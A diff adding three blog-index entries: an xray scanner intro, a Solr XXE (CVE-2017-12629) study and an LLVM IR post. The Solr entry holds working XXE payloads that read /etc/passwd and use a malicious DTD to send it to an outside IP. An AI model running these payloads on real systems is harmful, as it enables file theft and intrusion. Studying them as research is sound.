@@ -19,6 +19,412 @@
       </tags>
   </entry>
   <entry>
+    <title>XRAY介绍</title>
+    <url>/uncategorized/XRAY%E4%BB%8B%E7%BB%8D/</url>
+    <content><![CDATA[<h1><span id="扫描">扫描</span></h1><p>扫描：</p>
+<figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">xray webscan <span class="comment">--basic-crawler url</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>测试：</p>
+<figure class="highlight groovy"><table><tr><td class="code"><pre><span class="line">.\xray_windows_386.exe webscan --basic-crawler <span class="string">http:</span><span class="comment">//testphp.vulnweb.com/</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h2><span id="被动代理">被动代理</span></h2><p>代理扮演中间人角色。</p>
+<p>1.安装浏览器代理插件：SwitchyOmega插件</p>
+<p>2.生成xray证书并安装证书</p>
+<figure class="highlight livescript"><table><tr><td class="code"><pre><span class="line">.<span class="string">\xray_windows_386.exe</span> genca <span class="comment">#生成证书</span></span><br></pre></td></tr></table></figure>
+
+<p>然后安装证书</p>
+<p>3.启动代理</p>
+<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">.\<span class="selector-tag">xray_windows_386</span><span class="selector-class">.exe</span> <span class="selector-tag">webscan</span> <span class="selector-tag">--listen</span> 127<span class="selector-class">.0</span><span class="selector-class">.0</span><span class="selector-class">.1</span><span class="selector-pseudo">:1111</span> <span class="selector-tag">--html-output</span> <span class="selector-tag">proxy</span><span class="selector-class">.html</span></span><br></pre></td></tr></table></figure>
+
+]]></content>
+  </entry>
+  <entry>
+    <title>solr漏洞研究</title>
+    <url>/uncategorized/solr%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/</url>
+    <content><![CDATA[<p>本文主要研究solr漏洞</p>
+<h1><span id="apache-solr-xml-实体注入漏洞cve-2017-12629">Apache solr XML 实体注入漏洞（CVE-2017-12629）</span></h1><p>访问存在搭建好的漏洞网站：</p>
+<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">121.199</span>.<span class="number">53.175</span>:<span class="number">8983</span><span class="regexp">/solr/</span>demo<span class="regexp">/select</span></span><br></pre></td></tr></table></figure>
+
+<p>抓包：</p>
+<p><img src="/assets/image-20200611095414239.png" alt="image-20200611095414239"></p>
+<p>构造payload(利用dnslog):</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">/solr/demo/select?q=<span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">root</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">remote</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"http://123.8pby62.ceye.io/"</span>&gt;</span></span></span><br><span class="line"><span class="meta">%remote;]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>/&gt;</span>&amp;wt=xml&amp;defType=xmlparser</span><br></pre></td></tr></table></figure>
+
+<p>payload编码后：</p>
+<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">/solr/demo/<span class="keyword">select</span>?q=<span class="symbol">%3</span>C<span class="symbol">%3</span>Fxml<span class="symbol">%20</span>version<span class="symbol">%3</span>D<span class="symbol">%221</span>.<span class="number">0</span><span class="symbol">%22</span><span class="symbol">%20</span>encoding<span class="symbol">%3</span>D<span class="symbol">%22</span>UTF<span class="number">-8</span><span class="symbol">%22</span><span class="symbol">%3</span>F<span class="symbol">%3</span>E<span class="symbol">%0</span>A<span class="symbol">%3</span>C<span class="title">!DOCTYPE</span><span class="symbol">%20</span>root<span class="symbol">%20</span><span class="symbol">%5</span>B<span class="symbol">%0</span>A<span class="symbol">%3</span>C<span class="title">!ENTITY</span><span class="symbol">%20</span><span class="symbol">%25</span><span class="symbol">%20</span>remote<span class="symbol">%20</span>SYSTEM<span class="symbol">%20</span><span class="symbol">%22</span>http<span class="symbol">%3</span>A<span class="symbol">%2</span>F<span class="symbol">%2</span>F<span class="number">123.8</span>pby<span class="number">62</span>.ceye.io<span class="symbol">%2</span>F<span class="symbol">%22</span><span class="symbol">%3</span>E<span class="symbol">%0</span>A<span class="symbol">%25</span>remote<span class="symbol">%3</span>B<span class="symbol">%5</span>D<span class="symbol">%3</span>E<span class="symbol">%0</span>A<span class="symbol">%3</span>Croot<span class="symbol">%2</span>F<span class="symbol">%3</span>E&amp;wt=xml&amp;defType=xmlparser</span><br></pre></td></tr></table></figure>
+
+
+
+<p>成功显示：</p>
+<p><img src="/assets/image-20200611175358522.png" alt="image-20200611175358522"></p>
+<p>尝试读文件：</p>
+<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">/solr/demo/<span class="keyword">select</span>?q=<span class="symbol">%3</span>C<span class="symbol">%3</span>Fxml<span class="symbol">%20</span>version<span class="symbol">%3</span>D<span class="symbol">%221</span>.<span class="number">0</span><span class="symbol">%22</span><span class="symbol">%20</span>encoding<span class="symbol">%3</span>D<span class="symbol">%22</span>UTF<span class="number">-8</span><span class="symbol">%22</span><span class="symbol">%3</span>F<span class="symbol">%3</span>E<span class="symbol">%0</span>A<span class="symbol">%3</span>C<span class="title">!DOCTYPE</span><span class="symbol">%20</span>root<span class="symbol">%20</span><span class="symbol">%5</span>B<span class="symbol">%0</span>A<span class="symbol">%3</span>C<span class="title">!ENTITY</span><span class="symbol">%20</span><span class="symbol">%25</span><span class="symbol">%20</span>remote<span class="symbol">%20</span>SYSTEM<span class="symbol">%20</span><span class="symbol">%22</span>file<span class="symbol">%3</span>A<span class="symbol">%2</span>F<span class="symbol">%2</span>F<span class="symbol">%2</span>Fetc<span class="symbol">%2</span>Fpasswd<span class="symbol">%22</span><span class="symbol">%3</span>E<span class="symbol">%0</span>A<span class="symbol">%25</span>remote<span class="symbol">%3</span>B<span class="symbol">%5</span>D<span class="symbol">%3</span>E<span class="symbol">%0</span>A<span class="symbol">%3</span>Croot<span class="symbol">%2</span>F<span class="symbol">%3</span>E&amp;wt=xml&amp;defType=xmlparser</span><br></pre></td></tr></table></figure>
+
+<p><img src="/assets/image-20200611180009274.png" alt="image-20200611180009274"></p>
+<p>发现是无回显的XXE。</p>
+<p>可以使用恶意DTD外带敏感文件。</p>
+<p>恶意DTD:</p>
+<figure class="highlight mojolicious"><table><tr><td class="code"><pre><span class="line"><span class="xml"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">file</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:///etc/passwd"</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">all</span> <span class="meta-string">"&lt;!ENTITY &amp;#37; send SYSTEM 'http://104.243.21.153:8998/%file;'&gt;"</span>&gt;</span></span></span><br><span class="line"><span class="perl">%all;</span></span><br></pre></td></tr></table></figure>
+
+<p>攻击payload:</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">/solr/demo/select?q=<span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">root</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">remote</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"http://104.243.21.153/xxe/evil5.dtd"</span>&gt;</span></span></span><br><span class="line"><span class="meta">%remote;</span></span><br><span class="line"><span class="meta">%send;]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>/&gt;</span>&amp;wt=xml&amp;defType=xmlparser</span><br></pre></td></tr></table></figure>
+
+<p>urlencode后：</p>
+<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">/solr/demo/select?q=%<span class="number">3</span>C%<span class="number">3</span>Fxml%<span class="number">20</span>version%<span class="number">3</span>D%<span class="number">221.0</span>%<span class="number">22</span>%<span class="number">20</span>encoding%<span class="number">3</span>D%<span class="number">22</span>UTF<span class="number">-8</span>%<span class="number">22</span>%<span class="number">3</span>F%<span class="number">3</span>E%<span class="number">0</span>A%<span class="number">3</span>C!DOCTYPE%<span class="number">20</span>root%<span class="number">20</span>%<span class="number">5</span>B%<span class="number">0</span>A%<span class="number">3</span>C!ENTITY%<span class="number">20</span>%<span class="number">25</span>%<span class="number">20</span>remote%<span class="number">20</span>SYSTEM%<span class="number">20</span>%<span class="number">22</span>http%<span class="number">3</span>A%<span class="number">2</span>F%<span class="number">2</span>F104<span class="number">.243</span><span class="number">.21</span><span class="number">.153</span>%<span class="number">2</span>Fxxe%<span class="number">2</span>Fevil5.dtd%<span class="number">22</span>%<span class="number">3</span>E%<span class="number">0</span>A%<span class="number">25</span>remote%<span class="number">3</span>B%<span class="number">0</span>A%<span class="number">25</span>send%<span class="number">3</span>B%<span class="number">5</span>D%<span class="number">3</span>E%<span class="number">0</span>A%<span class="number">3</span>Croot%<span class="number">2</span>F%<span class="number">3</span>E&amp;wt=xml&amp;defType=xmlparser</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">/solr/demo/select?q=<span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">root</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">remote</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"http://104.243.21.153/xxe/evil5.dtd"</span>&gt;</span></span></span><br><span class="line"><span class="meta">%remote;</span></span><br><span class="line"><span class="meta">%send;]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="symbol">&amp;root;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span>&amp;wt=xml&amp;defType=xmlparser</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">/solr/demo/select?q=%<span class="number">3</span>C%<span class="number">3</span>Fxml%<span class="number">20</span>version%<span class="number">3</span>D%<span class="number">221.0</span>%<span class="number">22</span>%<span class="number">20</span>encoding%<span class="number">3</span>D%<span class="number">22</span>UTF<span class="number">-8</span>%<span class="number">22</span>%<span class="number">3</span>F%<span class="number">3</span>E%<span class="number">0</span>A%<span class="number">3</span>C!DOCTYPE%<span class="number">20</span>root%<span class="number">20</span>%<span class="number">5</span>B%<span class="number">0</span>A%<span class="number">3</span>C!ENTITY%<span class="number">20</span>%<span class="number">25</span>%<span class="number">20</span>remote%<span class="number">20</span>SYSTEM%<span class="number">20</span>%<span class="number">22</span>http%<span class="number">3</span>A%<span class="number">2</span>F%<span class="number">2</span>F104<span class="number">.243</span><span class="number">.21</span><span class="number">.153</span>%<span class="number">2</span>Fxxe%<span class="number">2</span>Fevil5.dtd%<span class="number">22</span>%<span class="number">3</span>E%<span class="number">0</span>A%<span class="number">25</span>remote%<span class="number">3</span>B%<span class="number">0</span>A%<span class="number">25</span>send%<span class="number">3</span>B%<span class="number">5</span>D%<span class="number">3</span>E%<span class="number">0</span>A%<span class="number">3</span>Cuser%<span class="number">3</span>E%<span class="number">26</span>root%<span class="number">3</span>B%<span class="number">3</span>C%<span class="number">2</span>Fuser%<span class="number">3</span>E&amp;wt=xml&amp;defType=xmlparser</span><br></pre></td></tr></table></figure>
+
+
+
+]]></content>
+  </entry>
+  <entry>
+    <title>LLVM系列-多态测试</title>
+    <url>/%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90/LLVM%E7%B3%BB%E5%88%97-%E5%A4%9A%E6%80%81%E6%B5%8B%E8%AF%95/</url>
+    <content><![CDATA[<p>此文主要探讨LLVM是如何处理多态的。</p>
+<a id="more"></a>
+
+
+
+<p>测试代码：</p>
+<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Created by ydq on 6/8/20.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span>&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b,<span class="keyword">int</span> c)</span></span>&#123;</span><br><span class="line">      <span class="keyword">return</span> a+b+c;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span></span>&#123;</span><br><span class="line">      <span class="keyword">return</span> a+b;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">  A a;</span><br><span class="line">  <span class="keyword">int</span> res1 = a.add(<span class="number">1</span>,<span class="number">2</span>);</span><br><span class="line">  <span class="keyword">int</span> res2 = a.add(<span class="number">1</span>,<span class="number">3</span>,<span class="number">4</span>);</span><br><span class="line">  <span class="built_in">cout</span>&lt;&lt;<span class="string">"res1:"</span>&lt;&lt;res1&lt;&lt;<span class="string">",res2:"</span>&lt;&lt;res2&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>llvm生成：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">clang -emit-llvm testclass.cpp -S -o testclass.ll</span><br></pre></td></tr></table></figure>
+
+<p>生成代码：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">; ModuleID &#x3D; &#39;testclass.cpp&#39;</span><br><span class="line">source_filename &#x3D; &quot;testclass.cpp&quot;</span><br><span class="line">target datalayout &#x3D; &quot;e-m:e-i64:64-f80:128-n8:16:32:64-S128&quot;</span><br><span class="line">target triple &#x3D; &quot;x86_64-unknown-linux-gnu&quot;</span><br><span class="line"></span><br><span class="line">%&quot;class.std::ios_base::Init&quot; &#x3D; type &#123; i8 &#125;</span><br><span class="line">%&quot;class.std::basic_ostream&quot; &#x3D; type &#123; i32 (...)**, %&quot;class.std::basic_ios&quot; &#125;</span><br><span class="line">%&quot;class.std::basic_ios&quot; &#x3D; type &#123; %&quot;class.std::ios_base&quot;, %&quot;class.std::basic_ostream&quot;*, i8, i8, %&quot;class.std::basic_streambuf&quot;*, %&quot;class.std::ctype&quot;*, %&quot;class.std::num_put&quot;*, %&quot;class.std::num_get&quot;* &#125;</span><br><span class="line">%&quot;class.std::ios_base&quot; &#x3D; type &#123; i32 (...)**, i64, i64, i32, i32, i32, %&quot;struct.std::ios_base::_Callback_list&quot;*, %&quot;struct.std::ios_base::_Words&quot;, [8 x %&quot;struct.std::ios_base::_Words&quot;], i32, %&quot;struct.std::ios_base::_Words&quot;*, %&quot;class.std::locale&quot; &#125;</span><br><span class="line">%&quot;struct.std::ios_base::_Callback_list&quot; &#x3D; type &#123; %&quot;struct.std::ios_base::_Callback_list&quot;*, void (i32, %&quot;class.std::ios_base&quot;*, i32)*, i32, i32 &#125;</span><br><span class="line">%&quot;struct.std::ios_base::_Words&quot; &#x3D; type &#123; i8*, i64 &#125;</span><br><span class="line">%&quot;class.std::locale&quot; &#x3D; type &#123; %&quot;class.std::locale::_Impl&quot;* &#125;</span><br><span class="line">%&quot;class.std::locale::_Impl&quot; &#x3D; type &#123; i32, %&quot;class.std::locale::facet&quot;**, i64, %&quot;class.std::locale::facet&quot;**, i8** &#125;</span><br><span class="line">%&quot;class.std::locale::facet&quot; &#x3D; type &lt;&#123; i32 (...)**, i32, [4 x i8] &#125;&gt;</span><br><span class="line">%&quot;class.std::basic_streambuf&quot; &#x3D; type &#123; i32 (...)**, i8*, i8*, i8*, i8*, i8*, i8*, %&quot;class.std::locale&quot; &#125;</span><br><span class="line">%&quot;class.std::ctype&quot; &#x3D; type &lt;&#123; %&quot;class.std::locale::facet.base&quot;, [4 x i8], %struct.__locale_struct*, i8, [7 x i8], i32*, i32*, i16*, i8, [256 x i8], [256 x i8], i8, [6 x i8] &#125;&gt;</span><br><span class="line">%&quot;class.std::locale::facet.base&quot; &#x3D; type &lt;&#123; i32 (...)**, i32 &#125;&gt;</span><br><span class="line">%struct.__locale_struct &#x3D; type &#123; [13 x %struct.__locale_data*], i16*, i32*, i32*, [13 x i8*] &#125;</span><br><span class="line">%struct.__locale_data &#x3D; type opaque</span><br><span class="line">%&quot;class.std::num_put&quot; &#x3D; type &#123; %&quot;class.std::locale::facet.base&quot;, [4 x i8] &#125;</span><br><span class="line">%&quot;class.std::num_get&quot; &#x3D; type &#123; %&quot;class.std::locale::facet.base&quot;, [4 x i8] &#125;</span><br><span class="line">%class.A &#x3D; type &#123; i8 &#125;</span><br><span class="line"></span><br><span class="line">$_ZN1A3addEii &#x3D; comdat any</span><br><span class="line"></span><br><span class="line">$_ZN1A3addEiii &#x3D; comdat any</span><br><span class="line"></span><br><span class="line">@_ZStL8__ioinit &#x3D; internal global %&quot;class.std::ios_base::Init&quot; zeroinitializer, align 1</span><br><span class="line">@__dso_handle &#x3D; external hidden global i8</span><br><span class="line">@_ZSt4cout &#x3D; external dso_local global %&quot;class.std::basic_ostream&quot;, align 8</span><br><span class="line">@.str &#x3D; private unnamed_addr constant [6 x i8] c&quot;res1:\00&quot;, align 1</span><br><span class="line">@.str.1 &#x3D; private unnamed_addr constant [7 x i8] c&quot;,res2:\00&quot;, align 1</span><br><span class="line">@.str.2 &#x3D; private unnamed_addr constant [2 x i8] c&quot;\0A\00&quot;, align 1</span><br><span class="line">@llvm.global_ctors &#x3D; appending global [1 x &#123; i32, void ()*, i8* &#125;] [&#123; i32, void ()*, i8* &#125; &#123; i32 65535, void ()* @_GLOBAL__sub_I_testclass.cpp, i8* null &#125;]</span><br><span class="line"></span><br><span class="line">; Function Attrs: noinline uwtable</span><br><span class="line">define internal void @__cxx_global_var_init() #0 section &quot;.text.startup&quot; &#123;</span><br><span class="line">entry:</span><br><span class="line">  call void @_ZNSt8ios_base4InitC1Ev(%&quot;class.std::ios_base::Init&quot;* @_ZStL8__ioinit)</span><br><span class="line">  %0 &#x3D; call i32 @__cxa_atexit(void (i8*)* bitcast (void (%&quot;class.std::ios_base::Init&quot;*)* @_ZNSt8ios_base4InitD1Ev to void (i8*)*), i8* getelementptr inbounds (%&quot;class.std::ios_base::Init&quot;, %&quot;class.std::ios_base::Init&quot;* @_ZStL8__ioinit, i32 0, i32 0), i8* @__dso_handle) #3</span><br><span class="line">  ret void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">declare dso_local void @_ZNSt8ios_base4InitC1Ev(%&quot;class.std::ios_base::Init&quot;*) unnamed_addr #1</span><br><span class="line"></span><br><span class="line">; Function Attrs: nounwind</span><br><span class="line">declare dso_local void @_ZNSt8ios_base4InitD1Ev(%&quot;class.std::ios_base::Init&quot;*) unnamed_addr #2</span><br><span class="line"></span><br><span class="line">; Function Attrs: nounwind</span><br><span class="line">declare dso_local i32 @__cxa_atexit(void (i8*)*, i8*, i8*) #3</span><br><span class="line"></span><br><span class="line">; Function Attrs: noinline norecurse optnone uwtable</span><br><span class="line">define dso_local i32 @main() #4 &#123;</span><br><span class="line">entry:</span><br><span class="line">  %a &#x3D; alloca %class.A, align 1</span><br><span class="line">  %res1 &#x3D; alloca i32, align 4</span><br><span class="line">  %res2 &#x3D; alloca i32, align 4</span><br><span class="line">  %call &#x3D; call i32 @_ZN1A3addEii(%class.A* %a, i32 1, i32 2)</span><br><span class="line">  store i32 %call, i32* %res1, align 4</span><br><span class="line">  %call1 &#x3D; call i32 @_ZN1A3addEiii(%class.A* %a, i32 1, i32 3, i32 4)</span><br><span class="line">  store i32 %call1, i32* %res2, align 4</span><br><span class="line">  %call2 &#x3D; call dereferenceable(272) %&quot;class.std::basic_ostream&quot;* @_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc(%&quot;class.std::basic_ostream&quot;* dereferenceable(272) @_ZSt4cout, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str, i32 0, i32 0))</span><br><span class="line">  %0 &#x3D; load i32, i32* %res1, align 4</span><br><span class="line">  %call3 &#x3D; call dereferenceable(272) %&quot;class.std::basic_ostream&quot;* @_ZNSolsEi(%&quot;class.std::basic_ostream&quot;* %call2, i32 %0)</span><br><span class="line">  %call4 &#x3D; call dereferenceable(272) %&quot;class.std::basic_ostream&quot;* @_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc(%&quot;class.std::basic_ostream&quot;* dereferenceable(272) %call3, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.1, i32 0, i32 0))</span><br><span class="line">  %1 &#x3D; load i32, i32* %res2, align 4</span><br><span class="line">  %call5 &#x3D; call dereferenceable(272) %&quot;class.std::basic_ostream&quot;* @_ZNSolsEi(%&quot;class.std::basic_ostream&quot;* %call4, i32 %1)</span><br><span class="line">  %call6 &#x3D; call dereferenceable(272) %&quot;class.std::basic_ostream&quot;* @_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc(%&quot;class.std::basic_ostream&quot;* dereferenceable(272) %call5, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.2, i32 0, i32 0))</span><br><span class="line">  ret i32 0</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">; Function Attrs: noinline nounwind optnone uwtable</span><br><span class="line">define linkonce_odr dso_local i32 @_ZN1A3addEii(%class.A* %this, i32 %a, i32 %b) #5 comdat align 2 &#123;</span><br><span class="line">entry:</span><br><span class="line">  %this.addr &#x3D; alloca %class.A*, align 8</span><br><span class="line">  %a.addr &#x3D; alloca i32, align 4</span><br><span class="line">  %b.addr &#x3D; alloca i32, align 4</span><br><span class="line">  store %class.A* %this, %class.A** %this.addr, align 8</span><br><span class="line">  store i32 %a, i32* %a.addr, align 4</span><br><span class="line">  store i32 %b, i32* %b.addr, align 4</span><br><span class="line">  %this1 &#x3D; load %class.A*, %class.A** %this.addr, align 8</span><br><span class="line">  %0 &#x3D; load i32, i32* %a.addr, align 4</span><br><span class="line">  %1 &#x3D; load i32, i32* %b.addr, align 4</span><br><span class="line">  %add &#x3D; add nsw i32 %0, %1</span><br><span class="line">  ret i32 %add</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">; Function Attrs: noinline nounwind optnone uwtable</span><br><span class="line">define linkonce_odr dso_local i32 @_ZN1A3addEiii(%class.A* %this, i32 %a, i32 %b, i32 %c) #5 comdat align 2 &#123;</span><br><span class="line">entry:</span><br><span class="line">  %this.addr &#x3D; alloca %class.A*, align 8</span><br><span class="line">  %a.addr &#x3D; alloca i32, align 4</span><br><span class="line">  %b.addr &#x3D; alloca i32, align 4</span><br><span class="line">  %c.addr &#x3D; alloca i32, align 4</span><br><span class="line">  store %class.A* %this, %class.A** %this.addr, align 8</span><br><span class="line">  store i32 %a, i32* %a.addr, align 4</span><br><span class="line">  store i32 %b, i32* %b.addr, align 4</span><br><span class="line">  store i32 %c, i32* %c.addr, align 4</span><br><span class="line">  %this1 &#x3D; load %class.A*, %class.A** %this.addr, align 8</span><br><span class="line">  %0 &#x3D; load i32, i32* %a.addr, align 4</span><br><span class="line">  %1 &#x3D; load i32, i32* %b.addr, align 4</span><br><span class="line">  %add &#x3D; add nsw i32 %0, %1</span><br><span class="line">  %2 &#x3D; load i32, i32* %c.addr, align 4</span><br><span class="line">  %add2 &#x3D; add nsw i32 %add, %2</span><br><span class="line">  ret i32 %add2</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">declare dso_local dereferenceable(272) %&quot;class.std::basic_ostream&quot;* @_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc(%&quot;class.std::basic_ostream&quot;* dereferenceable(272), i8*) #1</span><br><span class="line"></span><br><span class="line">declare dso_local dereferenceable(272) %&quot;class.std::basic_ostream&quot;* @_ZNSolsEi(%&quot;class.std::basic_ostream&quot;*, i32) #1</span><br><span class="line"></span><br><span class="line">; Function Attrs: noinline uwtable</span><br><span class="line">define internal void @_GLOBAL__sub_I_testclass.cpp() #0 section &quot;.text.startup&quot; &#123;</span><br><span class="line">entry:</span><br><span class="line">  call void @__cxx_global_var_init()</span><br><span class="line">  ret void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">attributes #0 &#x3D; &#123; noinline uwtable &quot;correctly-rounded-divide-sqrt-fp-math&quot;&#x3D;&quot;false&quot; &quot;disable-tail-calls&quot;&#x3D;&quot;false&quot; &quot;less-precise-fpmad&quot;&#x3D;&quot;false&quot; &quot;no-frame-pointer-elim&quot;&#x3D;&quot;true&quot; &quot;no-frame-pointer-elim-non-leaf&quot; &quot;no-infs-fp-math&quot;&#x3D;&quot;false&quot; &quot;no-jump-tables&quot;&#x3D;&quot;false&quot; &quot;no-nans-fp-math&quot;&#x3D;&quot;false&quot; &quot;no-signed-zeros-fp-math&quot;&#x3D;&quot;false&quot; &quot;no-trapping-math&quot;&#x3D;&quot;false&quot; &quot;stack-protector-buffer-size&quot;&#x3D;&quot;8&quot; &quot;target-cpu&quot;&#x3D;&quot;x86-64&quot; &quot;target-features&quot;&#x3D;&quot;+fxsr,+mmx,+sse,+sse2,+x87&quot; &quot;unsafe-fp-math&quot;&#x3D;&quot;false&quot; &quot;use-soft-float&quot;&#x3D;&quot;false&quot; &#125;</span><br><span class="line">attributes #1 &#x3D; &#123; &quot;correctly-rounded-divide-sqrt-fp-math&quot;&#x3D;&quot;false&quot; &quot;disable-tail-calls&quot;&#x3D;&quot;false&quot; &quot;less-precise-fpmad&quot;&#x3D;&quot;false&quot; &quot;no-frame-pointer-elim&quot;&#x3D;&quot;true&quot; &quot;no-frame-pointer-elim-non-leaf&quot; &quot;no-infs-fp-math&quot;&#x3D;&quot;false&quot; &quot;no-nans-fp-math&quot;&#x3D;&quot;false&quot; &quot;no-signed-zeros-fp-math&quot;&#x3D;&quot;false&quot; &quot;no-trapping-math&quot;&#x3D;&quot;false&quot; &quot;stack-protector-buffer-size&quot;&#x3D;&quot;8&quot; &quot;target-cpu&quot;&#x3D;&quot;x86-64&quot; &quot;target-features&quot;&#x3D;&quot;+fxsr,+mmx,+sse,+sse2,+x87&quot; &quot;unsafe-fp-math&quot;&#x3D;&quot;false&quot; &quot;use-soft-float&quot;&#x3D;&quot;false&quot; &#125;</span><br><span class="line">attributes #2 &#x3D; &#123; nounwind &quot;correctly-rounded-divide-sqrt-fp-math&quot;&#x3D;&quot;false&quot; &quot;disable-tail-calls&quot;&#x3D;&quot;false&quot; &quot;less-precise-fpmad&quot;&#x3D;&quot;false&quot; &quot;no-frame-pointer-elim&quot;&#x3D;&quot;true&quot; &quot;no-frame-pointer-elim-non-leaf&quot; &quot;no-infs-fp-math&quot;&#x3D;&quot;false&quot; &quot;no-nans-fp-math&quot;&#x3D;&quot;false&quot; &quot;no-signed-zeros-fp-math&quot;&#x3D;&quot;false&quot; &quot;no-trapping-math&quot;&#x3D;&quot;false&quot; &quot;stack-protector-buffer-size&quot;&#x3D;&quot;8&quot; &quot;target-cpu&quot;&#x3D;&quot;x86-64&quot; &quot;target-features&quot;&#x3D;&quot;+fxsr,+mmx,+sse,+sse2,+x87&quot; &quot;unsafe-fp-math&quot;&#x3D;&quot;false&quot; &quot;use-soft-float&quot;&#x3D;&quot;false&quot; &#125;</span><br><span class="line">attributes #3 &#x3D; &#123; nounwind &#125;</span><br><span class="line">attributes #4 &#x3D; &#123; noinline norecurse optnone uwtable &quot;correctly-rounded-divide-sqrt-fp-math&quot;&#x3D;&quot;false&quot; &quot;disable-tail-calls&quot;&#x3D;&quot;false&quot; &quot;less-precise-fpmad&quot;&#x3D;&quot;false&quot; &quot;no-frame-pointer-elim&quot;&#x3D;&quot;true&quot; &quot;no-frame-pointer-elim-non-leaf&quot; &quot;no-infs-fp-math&quot;&#x3D;&quot;false&quot; &quot;no-jump-tables&quot;&#x3D;&quot;false&quot; &quot;no-nans-fp-math&quot;&#x3D;&quot;false&quot; &quot;no-signed-zeros-fp-math&quot;&#x3D;&quot;false&quot; &quot;no-trapping-math&quot;&#x3D;&quot;false&quot; &quot;stack-protector-buffer-size&quot;&#x3D;&quot;8&quot; &quot;target-cpu&quot;&#x3D;&quot;x86-64&quot; &quot;target-features&quot;&#x3D;&quot;+fxsr,+mmx,+sse,+sse2,+x87&quot; &quot;unsafe-fp-math&quot;&#x3D;&quot;false&quot; &quot;use-soft-float&quot;&#x3D;&quot;false&quot; &#125;</span><br><span class="line">attributes #5 &#x3D; &#123; noinline nounwind optnone uwtable &quot;correctly-rounded-divide-sqrt-fp-math&quot;&#x3D;&quot;false&quot; &quot;disable-tail-calls&quot;&#x3D;&quot;false&quot; &quot;less-precise-fpmad&quot;&#x3D;&quot;false&quot; &quot;no-frame-pointer-elim&quot;&#x3D;&quot;true&quot; &quot;no-frame-pointer-elim-non-leaf&quot; &quot;no-infs-fp-math&quot;&#x3D;&quot;false&quot; &quot;no-jump-tables&quot;&#x3D;&quot;false&quot; &quot;no-nans-fp-math&quot;&#x3D;&quot;false&quot; &quot;no-signed-zeros-fp-math&quot;&#x3D;&quot;false&quot; &quot;no-trapping-math&quot;&#x3D;&quot;false&quot; &quot;stack-protector-buffer-size&quot;&#x3D;&quot;8&quot; &quot;target-cpu&quot;&#x3D;&quot;x86-64&quot; &quot;target-features&quot;&#x3D;&quot;+fxsr,+mmx,+sse,+sse2,+x87&quot; &quot;unsafe-fp-math&quot;&#x3D;&quot;false&quot; 